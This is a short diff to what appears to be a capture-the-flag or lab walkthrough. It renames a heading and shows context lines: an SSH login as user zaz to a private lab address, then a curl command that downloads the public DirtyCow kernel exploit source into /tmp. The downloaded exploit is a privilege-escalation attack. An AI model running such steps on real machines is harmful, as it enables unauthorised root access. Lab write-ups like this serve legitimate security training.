@@ -6,7 +6,7 @@ Connect with zaz:\
 $ ssh zaz@192.168.56.102
 ```
 
-## Another DirtyCow
+## Another Dirty cow
 ```
 $ cd /tmp
 $ curl https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c --output cow.c
